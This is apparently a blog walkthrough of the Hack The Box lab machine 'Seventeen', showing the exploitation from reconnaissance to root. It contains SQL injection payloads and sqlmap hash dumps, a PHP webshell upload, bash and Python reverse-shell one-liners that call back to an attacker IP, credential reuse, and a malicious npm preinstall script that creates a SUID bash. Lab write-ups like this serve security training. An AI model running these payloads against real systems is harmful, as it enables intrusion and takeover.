---
layout: post
title: Hack The Box - Seventeen
---

Today I decided to tackle the latest hard release "Seventeen" from [HackTheBox](https://www.hackthebox.eu)

---
[![](/assets/image/attachments/Pasted&#32;image&#32;2020220530000215.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220530000215.png){:.glightbox}

## Summary
Seventeen's user is about detailed enumeration. There is a lot of things to look at, that might lead you astray (as it did with me). We find a file management service with an upload functionality that can be exploited to upload a php reverse shell, but the file upload only works when accessing the application via the correct subdomain. From here we enumerate first in a docker container and then in the host itself to find exposed credentials, which we can reuse to gain access to user accounts on the target.

To gain root we take advantage of using sudo to run a script which performs `npm install`, and an unusual npm configuration in which we control a `.npmrc` file, where we can set the unsafe_perm option, allowing us to achieve code execution through the scripts - preinstall option in the package.json of one of the modules being installed.

## Enumeration
My enumeration is definitely overkill, but I don't like taking the chance of missing something.

### nmap
```shell
> nmap -T4 -sS -p- 10.129.76.4 -Pn -oN ./scans/10.129.76.4-full

# Nmap 7.92 scan initiated Sat May 28 15:46:35 2022 as: nmap -T4 -sS -p- -Pn -oN ./scans/10.129.76.4-full 10.129.76.4
Nmap scan report for 10.129.76.4
Host is up (0.029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

# Nmap done at Sat May 28 16:01:00 2022 -- 1 IP address (1 host up) scanned in 865.38 seconds

> nmap --top-ports 100 -sUV 10.129.76.4 -oN ./scans/10.129.76.4-UDP100

# Nmap 7.92 scan initiated Sat May 28 16:01:00 2022 as: nmap --top-ports 100 -sUV -oN ./scans/10.129.76.4-UDP100 10.129.76.4
Nmap scan report for 10.129.76.4
Host is up (0.19s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 28 16:04:21 2022 -- 1 IP address (1 host up) scanned in 201.32 seconds    
```

### rustscan

```shell
> rustscan -a 10.129.76.4 --ulimit 5000 -b 2000 -t 2000 -- -sC -sV -oN 10.129.76.4

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.76.4:22
Open 10.129.76.4:80
Open 10.129.76.4:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 15:46 EDT

...SNIP

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHHzDWE8/Dfufa10CkPUABokOTHnbh7SJPAGBMj8wfq13PO3C8lzrwhGR6EL7wBm8Z9O7MaX7VR7Dkw5UdFH5x2gj+zqmt+Rem3eGmS1LZ55W6sm8nErzTPaQNN/z/Q421YeNltG8oEO+yBdo9OtkDXdCWXk1TMEaWhBEasUkg7asLTM6rQVKBltrWRJ8JB5YxfY/uOwub+mzbPjdsLdCK+qJ481CwhBOpmCq4W/2VdsYpnNMOfoISDUgFe/Qx748rfdonObgNuP62V3XE2E86ZAAb2F53/40mV7Jrl6Wsq0N2oQhrfj09vpK80dyyo2z/ToCkghKiTHGEv3ni+OZR
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLbEmvlGDh/lmuPXBB4HGvZk6QXtQQpi5ZOO8IF5s2J7ALrLNyqwWwhRJcas+bjTbkjMqvCsUJFmr6yU8MnTg7A=
|   256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUiAhSZ9sSPHOlWwgxtznpmQq8RU4GgQQcwHDxJiFi0
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Let's begin your education with us!
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    syn-ack Apache httpd 2.4.38
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.4; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### autorecon

```shell
> autorecon  --single-target 10.129.76.4
```

autorecon produces a copious amount of results, so I will omit them here. On review some things that stand out to me:

#### Notable finds
```
http-internal-ip-disclosure
Internal IP Leaked: 127.0.1.1 #?

port 8000
Service Info: Host: 172.17.0.4 # docker?

http://seventeen.htb/vendor/
http://seventeen.htb/vendor/exams/
http://seventeen.htb/vendor/mastermailer/
http://seventeen.htb/vendor/oldmanagement/
```


## Foothold
#### disclaimer
I pursued rabbit holes here but I have left in my steps exploring them to demonstrate my methodology.

I began by exploring each of the subdirectories within vendor. I soon found each to be hosting it's own application.

#### `vendor/exams/`
[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529145721.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529145721.png){:.glightbox}

maybe we can find a source for this via the developer name

admin login disabled
http://seventeen.htb/vendor/exams/admin/login.php

#### `vendor/mastermailer/`
A login screen, could not get past it with basic bypass attempts.

#### `vendor/oldmanagement/`


http://seventeen.htb/vendor/oldmanagement/admin/

There is an administrator login

Trying a basic sql injection we get in
```
username=admin%27+or+1%3D1%3B+--+-&password=admin&login=
```

we get into the admin panel, and find some usernames

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529153654.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529153654.png){:.glightbox}

People
```
Mark Anthony
Steven Smith
```

Users
```
admin
UndetectableMark
Stev1992
```

with research find documented vulnerability the same as we had found
maybe can dump the contents of the database using this

https://www.exploit-db.com/exploits/48437

and the source code 

```txt
https://www.sourcecodester.com/sites/default/files/download/razormist/school-file-management-system.zip
```

we see from the source code the structure of the SQL query

```php
...SNIP

$query = mysqli_query($conn, "SELECT * FROM `user` WHERE `username` = '$username' && `password` = '$password'") or die(mysqli_error());

..SNIP
```

let's use `sqlmap` to automate the injection to dump this database. I create a local file admin.req with the request content from burp

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529155325.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529155325.png){:.glightbox}

I clean up the username parameter for sqlmap, because it does not like parameters with manual sql injection attempts. The updated parameters line is:

```bash
username=admin&password=admin&login=
```

now run `sqlmap`

```bash
> sqlmap -r admin.req

...SNIP

[10:48:15] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable


...SNIP

```

although it does not proceed with the injection.

but, we see in the logs 

```bash
[10:48:56] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
```

let's try again with this option set

```bash
> sqlmap -r admin.req --dbms=mysql


...SNIP

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 107 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2524 FROM (SELECT(SLEEP(5)))xERJ) AND 'Cmqx'='Cmqx&password=admin&login=
---


...SNIP
```

we have time-based blind injection.

This will be slow so we have to be particular about what we decide to dump or we will be here all day...

Let's dump the database names to start with. We run a tables query and kill it after database names have been enumerated.

```bash
> sqlmap -r admin.req --tables

...SNIP

[10:50:53] [INFO] fetching database names
[10:50:53] [INFO] fetching number of databases
[10:50:53] [INFO] retrieved: 4
[10:50:54] [INFO] retrieved: information_schema
[10:52:00] [INFO] retrieved: db_sfms
[10:52:27] [INFO] retrieved: erms_db
[10:52:54] [INFO] retrieved: roundcu
[10:53:24] [ERROR] invalid character detected. retrying..
[10:53:24] [WARNING] increasing time delay to 2 seconds
bedb
[10:53:44] [INFO] fetching tables for databases: 'db_sfms, erms_db, information_schema, roundcubedb'

...SNIP

```

so we have the databases:
```bash
db_sfms                     # database school file management system
erms_db                     # exam ??? management system
information_schema
roundcubedb                 # ??
```

we know the table and column names from the query in the source code, so let's dump the users and password for db_sfms

```bash
> sqlmap -r admin.req --dbms=mysql -D db_sfms -T user -C username,password --dump

...SNIP

[3 entries]
+------------------+----------------------------------+
| username         | password                         |
+------------------+----------------------------------+
| Stev1992         | 112dd9d08abf9dcceec8bc6d3e26b138 |
| UndetectableMark | b35e311c80075c4916935cbbbd770cef |
| admin            | fc8ec7b43523e186a27f46957818391c |
+------------------+----------------------------------+

...SNIP

```

let's see if we can identify the hash type and crack these

it seems they are md5, let's see if we can crack them. Create a local file with the hashes and run hashcat

```bash
> hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt
```

none were crackable, but at least we found some usernames

let's look in the other databases

```bash
> sqlmap -r admin.req --dbms=mysql -D erms_db --tables

...SNIP
[6 tables]
+---------------+
| category_list |
| exam_list     |
| option_list   |
| question_list |
| system_info   |
| users         |
+---------------+
...SNIP

> sqlmap -r admin.req --dbms=mysql -D erms_db -T users --columns

...SNIP
[11:49:54] [INFO] retrieved:
[11:49:59] [INFO] adjusting time delay to 1 second due to good response times
id
[11:50:05] [INFO] retrieved: int(50)
[11:50:32] [INFO] retrieved: firstname
[11:51:01] [INFO] retrieved: varchar(250)
[11:51:41] [INFO] retrieved: lastname
[11:52:07] [INFO] retrieved: varchar(250)
[11:52:46] [INFO] retrieved: username
[11:53:10] [INFO] retrieved: text
[11:53:28] [INFO] retrieved: password
[11:53:58] [INFO] retrieved: text
[11:54:15] [INFO] retrieved: avatar
[11:54:32] [INFO] retrieved: text
[11:54:50] [INFO] retrieved: last_login
[11:55:30] [INFO] retrieved: datetime
[11:55:55] [INFO] retrieved: type
[11:56:11] [INFO] retrieved: tinyint(1)
[11:56:51] [INFO] retrieved: date_added
[11:57:24] [INFO] retrieved: datetime

...SNIP

> sqlmap -r admin.req --dbms=mysql -D erms_db -T users -C username,password --dump

...SNIP
[3 entries]
+------------------+----------------------------------+
| username         | password                         |
+------------------+----------------------------------+
| Stev1992         | 184fe92824bea12486ae9a56050228ee |
| UndetectableMark | 48bb86d036bb993dfdcf7fefdc60cc06 |
| admin            | fc8ec7b43523e186a27f46957818391c |
+------------------+----------------------------------+
...SNIP

```

same hash for admin, but different for other users. Let's see if these crack... nope

on further inspection there are student accounts on the School File Management System, let's leak that table

table and column names found from source code to save time dumping them aswell

```php
# login_query.php
$query = mysqli_query($conn, "SELECT * FROM `student` WHERE `stud_no` = '$stud_no' && `password` = '$password'") or die(mysqli_error());
```

```bash
> sqlmap -r admin.req --dbms=mysql -D db_sfms -T student -C stud_no,password --dump

+---------+----------------------------------+
| stud_no | password                         |
+---------+----------------------------------+
| 12345   | 1a40620f9a4ed6cb8d81a1d365559233 |
| 23347   | abb635c915b0cc296e071e8d76e9060c |
| 31234   | a2afa567b1efdb42d8966353337d9024 |
| 43347   | a1428092eb55781de5eb4fd5e2ceb835 |
+---------+----------------------------------+


```
Let's see if we can crack these

finally, we get a hash to crack this time

```
31234:a2afa567b1efdb42d8966353337d9024:autodestruction
```
cross referencing to the student accounts in the webapp, this pass word is for Kelly Shane

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529173008.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529173008.png){:.glightbox}


#### file upload
Using the same type of sql injection on the student login at 
http://seventeen.htb/vendor/oldmanagement/

we can get onto the student profile

```
stud_no=12345';-- -&password=asd&login=
```

here there is a file upload functionality but it doesn't seem to be working...

every attempt seems to redirect to http://seventeen.htb/vendor/oldmanagement/save_file.php but not actually upload the file

From the source code of the application we found online earlier, we can see the source code of `save_file.php`

```php
<?php

require_once 'admin/conn.php';

if(ISSET($_POST['save'])){

$stud_no = $_POST['stud_no'];

$file_name = $_FILES['file']['name'];

$file_type = $_FILES['file']['type'];

$file_temp = $_FILES['file']['tmp_name'];

$location = "files/".$stud_no."/".$file_name;

$date = date("Y-m-d, h:i A", strtotime("+8 HOURS"));

if(!file_exists("files/".$stud_no)){

mkdir("files/".$stud_no);

}

if(move_uploaded_file($file_temp, $location)){

mysqli_query($conn, "INSERT INTO `storage` VALUES('', '$file_name', '$file_type', '$date', '$stud_no')") or die(mysqli_error());

header('location: student_profile.php');

}

}

?>
```
it isn't clear why this doesn't work

#### files
in the source code we see a folder named files at the root, let's see what it contains on the box

http://seventeen.htb/vendor/oldmanagement/files/

entering the first directory we see

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529162708.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529162708.png){:.glightbox}

papers.php seem to run the `id` command? 

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529164441.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529164441.png){:.glightbox}

interestingly there seems to be a php source file version at http://seventeen.htb/vendor/oldmanagement/files/31234/papers.phps

however it gives a 403 forbidden

The PDF contains an interesting note

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529162937.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529162937.png){:.glightbox}

let's add this to` /etc/hosts` and check it out

navigating to http://mastermailer.seventeen.htb we are redirected to http://mastermailer.seventeen.htb:8000/mastermailer/

even with the Kelly credentials we found earlier cannot use this, we get an error

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529175942.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529175942.png){:.glightbox}

with some more enumeration on this vhost, we see it hosts the same file management application as the main domain at http://mastermailer.seventeen.htb:8000/oldmanagement/

using the same sql injection (or simply Kelly's credentials) we login and try the file upload functionality at http://mastermailer.seventeen.htb:8000/oldmanagement/student_profile.php, and luckily this time it is successful. We upload a simple php webshell to confirm

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529182808.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529182808.png){:.glightbox}

now to check for remote code execution we access our webshell at http://mastermailer.seventeen.htb:8000/oldmanagement/files/31234/simple.php?gg=id

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529182957.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529182957.png){:.glightbox}

now we can submit a reverse shell, I frequently have success with this basic reverse shell: 
```bash
bash -i >& /dev/tcp/10.10.14.73/13897 0>&1
```

I stand up a listener with netcat ( `nc -lvnp 13897`), url encode the payload using cyberchef, and submit it at my webshell  http://mastermailer.seventeen.htb:8000/oldmanagement/files/31234/simple.php?gg=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E73%2F13897%200%3E%261

we don't get a callback,at this point I tried various reverse shell payloads trying to find one that would work successfully, when I remembered from enumeration

```
Service Info: Host: 172.17.0.4; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

this means we are likely getting RCE on a docker container so the options we have for reverse shells are more narrow.

we see python is in the container
http://mastermailer.seventeen.htb:8000/oldmanagement/files/31234/simple.php?gg=which%20python

so we will try a python reverse shell
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.73",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
we url encode and execute via our webshell
http://mastermailer.seventeen.htb:8000/oldmanagement/files/31234/simple.php?gg=python%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2210%2E10%2E14%2E73%22%2C443%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bimport%20pty%3B%20pty%2Espawn%28%22sh%22%29%27

this one connects back and gives us a shell

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529184017.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529184017.png){:.glightbox}

## User
We begin with just some basic manual enumeration. Let's look through the config files of all available web applications to see if we can find any further credentials.

in `/var/www/html/employeemanagementsystem/process/dbh.php` we find our first credentials

```php
<?php

$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";

...SNIP
```

the next in `/var/www/html/mastermailer/config/config.inc.php`
```php
...SNIP

$config['db_dsnw'] = 'mysql://mysqluser:mysqlpassword@127.0.0.1/roundcubedb';

...SNIP
```

mysqluser:mysqlpassword

and again in  `/var/www/html/oldmanagement/admin/conn.php`
```php
...SNIP

$conn = mysqli_connect("127.0.0.1", "mysqluser", "mysqlpassword", "db_sfms");

...SNIP
```

we can access mysql with 
```bash
> mysql -u mysqluser -p
```

but it doesn't give us anythjing we haven't already found

trying to access with root provides the error:
```
ERROR 1524 (HY000): Plugin 'auth_socket' is not loaded
```

maybe the credential "2020bestyearofmylife" is reused somewhere

we check /etc/passwd for users
```sh
> cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
mark:x:1000:1000:,,,:/var/www/html:/bin/bash

```

so maybe mark has put this credential here when configuring, what if it is reused by him on the host? let's try to ssh as mark

```bash
> ssh mark@10.129.76.130
```

using "2020bestyearofmylife" we get in as mark and find user.txt.

## Privilege Escalation - Second User
Let's repeat our credential harvesting technique in `/var/www/html/vendor`

"mastermailer" and "oldmanagement" have the same config (except pointed at the docker container instead of localhost) so we will look at exams

in `/var/www/html/vendor/exams/initialize.php` we see a new configuration, but with the same credentials 
```php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://exams.seventeen.htb/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"172.18.0.1");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"mysqluser");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"mysqlpassword");
if(!defined('DB_NAME')) define('DB_NAME',"erms_db");
?>

```

at the home directory of mark we find `.npm` which is normally not seen. Investigating further there is an directory referencing a local service, let's see if it's running

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529195105.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529195105.png){:.glightbox}

with curl we see it is a html page

```bash
>  curl localhost:4873

    <!DOCTYPE html>
      <html lang="en-us">
      <head>
        <meta charset="utf-8">
        <base href="http://localhost:4873/">
        <title>Verdaccio</title>
        <link rel="icon" href="http://localhost:4873/-/static/favicon.ico"/>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <script>
            window.__VERDACCIO_BASENAME_UI_OPTIONS={"darkMode":false,"basename":"/","base":"http://localhost:4873/","primaryColor":"#4b5e40","version":"5.6.0","pkgManagers":["yarn","pnpm","npm"],"login":true,"logo":"","title":"Verdaccio","scope":"","language":"es-US"}
        </script>

      </head>
      <body class="body">

        <div id="root"></div>
        <script defer="defer" src="http://localhost:4873/-/static/runtime.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/vendors.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/main.06493eae2f534100706f.js"></script>

      </body>
    </html>

```

let's exit and reconnect ssh with port forwarding (also forwarding a higher port for investigation)

```
ssh mark@10.129.76.130 -L 4873:localhost:4873 -L 44465:localhost:44465
```

now navigating to http://localhost:4873 we see a webapp Verdaccio.

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529200148.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529200148.png){:.glightbox}

Let's scan both with nmap
```sh
>  nmap 127.0.0.1 -p 4873, 44465 -sVC      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 15:02 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
4873/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest:
|     HTTP/1.1 403 Forbidden
|     Access-Control-Allow-Origin: *
|     Content-Type: application/json; charset=utf-8
|     Content-Length: 33
|     ETag: W/"21-gxPGy8RwM7ana23iNasr/U+NIcA"
|     Vary: Accept-Encoding
|     Date: Sun, 29 May 2022 19:02:52 GMT
|     Connection: close
|     "error": "invalid package"
|   GetRequest:
|     HTTP/1.1 500 Internal Server Error
|     Access-Control-Allow-Origin: *
|     X-Frame-Options: deny
|     Content-Security-Policy: connect-src 'self'
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Type: application/json; charset=utf-8
|     Content-Length: 39
|     ETag: W/"27-/hJgrcw+XR/TN16YOmhj0wZyJYc"
|     Vary: Accept-Encoding
|     Date: Sun, 29 May 2022 19:02:51 GMT
|     Connection: close
|     "error": "internal server error"
|   HTTPOptions:
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Sun, 29 May 2022 19:02:51 GMT
|_    Connection: close
...SNIP
```

looked into this for a while but didn't find anything immediately...

back on the box now, looking in `/opt` we find something interesting

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529204330.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529204330.png){:.glightbox}

but before going into mysql let's try the other users on the box

kavi:IhateMathematics123#

gets us logged in as `kavi`

## Privilege Escalation - Root

### disclaimer
__NOTE__ at the time of completing this box, this was a valid path to root but has since been patched out by the authors. I will leave it unchanged as it reflects how I completed the box at that time. To see the intended path, check out writeups from [0xdf](https://0xdf.gitlab.io/2022/09/24/htb-seventeen.html) or [ippsec](https://www.youtube.com/watch?v=U-2nI6wSPOE).

runing `sudo -l` we see kavi can run the startup script we saw earlier

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529222443.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529222443.png){:.glightbox}

a reminder on the contents

```bash
#!/bin/bash

cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep
    else
        /bin/echo "[+] $dep already installed"

    fi
done

/bin/echo "[+] Starting the app"

/usr/bin/node /opt/app/index.js

```

inspecting `/opt/app/node_modules/` we see db-logger is installed, but loglevel is not, so my idea is create a malicious loglevel package and publish it on the private registry running at http://localhost:4873, now this would be a great idea except the registry is not allowing any additional user registration so we cannot publish...

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223118.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223118.png){:.glightbox}

at this point I used sudo to run the startup script to investigate what is happening

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223409.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223409.png){:.glightbox}

In the db-logger package.json `/opt/app/node_modules/db-logger/package.json` we see a mysql dependancy

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223613.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223613.png){:.glightbox}

now since kavi controls the mysql directory, if we can change the `package.json` found there, we can insert a "preinstall" option to get code execution.

examining the directory

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529223902.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529223902.png){:.glightbox}

okay that might seem like a problem but we own the directory containing the file, so we can move and replace `package.json`

```bash
> cp /opt/app/node_modules/mysql/package.json ~/package.json 
> rm /opt/app/node_modules/mysql/package.json 
```

now we can edit `~/package.json` to include a preinstall script and move it back

```bash
> vi ~/package.json


...SNIP


  "scripts": {
    "lint": "eslint . && node tool/lint-readme.js",
    "test": "node test/run.js",
    "test-ci": "node tool/install-nyc.js --nyc-optional --reporter=text -- npm test",
    "test-cov": "node tool/install-nyc.js --reporter=html --reporter=text -- npm test",
    "version": "node tool/version-changes.js && git add Changes.md",
    
    "preinstall":"cp /bin/bash /tmp/sbash && chmod +s /tmp/sbash"
    
  },
  "version": "2.18.1"
}



```

`cp /bin/bash /tmp/sbash && chmod +s /tmp/sbash` - this command when run and root will give us a SUID copy of `/bin/bash` accessible from `/tmp`

now to move our modified `package.json` back and run the startup script again
```
> cp ~/package.json /opt/app/node_modules/mysql/package.json
> sudo /opt/app/startup.sh
```

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529233348.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529233348.png){:.glightbox}

with some research we come across https://stackoverflow.com/questions/18136746/npm-install-failed-with-cannot-run-in-wd

we discover that we need the unsafe-perm configuration set to true.

we cannot change the npm install commands in the script to add the `--unsafe-perm=true` argument, but we can maybe set it elsewhere

running `npm config ls`

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529234432.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529234432.png){:.glightbox}

with some more googling I find unsafe-perm may be set in .npmrc file

https://pnpm.io/npmrc

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529234537.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529234537.png){:.glightbox}

```bash
> vi ~/.npmrc # add unsafe-perm line
> cat ~/.npmrc
registry=http://127.0.0.1:4873/
unsafe-perm=true

```

Now we will run the startup.sh script again

[![](/assets/image/attachments/Pasted&#32;image&#32;2020220529235430.png)](/assets/image/attachments/Pasted&#32;image&#32;2020220529235430.png){:.glightbox}

And we get a SUID bash, giving us root!

##### Some things to note:
- There is a refresh script running as root that will frequently remove the loglevel package from `/opt/app/node_modules` this is necessary to trigger the preinstall in mysql, so if it is not running this may be why
- it also resets /home/kavi/.npmrc (and will remove the unsafe-perm setting) so be aware you will need to run the startup script quickly after adding the configuration option before it is reset